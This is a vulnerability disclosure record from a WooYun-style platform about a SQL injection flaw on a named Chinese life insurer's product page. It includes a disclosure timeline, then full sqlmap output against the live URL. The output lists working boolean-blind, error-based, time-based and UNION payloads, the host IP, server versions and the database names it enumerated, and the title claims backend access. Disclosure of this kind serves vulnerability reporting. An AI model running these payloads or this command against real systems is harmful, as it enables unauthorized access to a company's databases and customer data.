wybug_title: 长生人寿一处SQL注入(已进后台)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-17：	细节已通知厂商并且等待厂商处理中									2015-08-19：	厂商已经确认，细节仅向厂商公开									2015-08-29：	细节向核心白帽子及相关领域专家公开									2015-09-08：	细节向普通白帽子公开									2015-09-18：	细节向实习白帽子公开									2015-10-03：	细节向公众公开  简要描述： 1 详细说明：  
Target: 		http://www.nissay-greatwall.com.cn/product/product.php?aid=126Host IP:		222.73.5.159Web Server: 	Apache/2.2.3 (CentOS)Powered-by: 	PHP/5.1.6DB Server: 	MySQL >=5Current DB: 	nissay
F:\Python27\sqlmap>sqlmap.py -u "http://www.nissay-greatwall.com.cn/product/product.php?aid=126" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150529}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:11:15[13:11:15] [INFO] resuming back-end DBMS 'mysql'[13:11:15] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: aid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: aid=126' AND 2562=2562 AND 'FGmo'='FGmo    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: aid=126' AND (SELECT 2985 FROM(SELECT COUNT(*),CONCAT(0x71786a7071,(SELECT (ELT(2985=2985,1))),0x71717a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'oxUl'='oxUl    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: aid=126' AND (SELECT * FROM (SELECT(SLEEP(5)))lWDJ) AND 'pUce'='pUce    Type: UNION query    Title: Generic UNION query (NULL) - 24 columns    Payload: aid=126' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786a7071,0x4a4d466f474e6f4c496e,0x71717a7a71)-----[13:11:17] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5.0[13:11:17] [INFO] fetching database names[13:11:17] [INFO] the SQL query used returns 3 entries[13:11:17] [INFO] resumed: information_schema[13:11:17] [INFO] resumed: nissay[13:11:17] [INFO] resumed: testavailable databases [3]:[*] information_schema[*] nissay[*] test   漏洞证明：
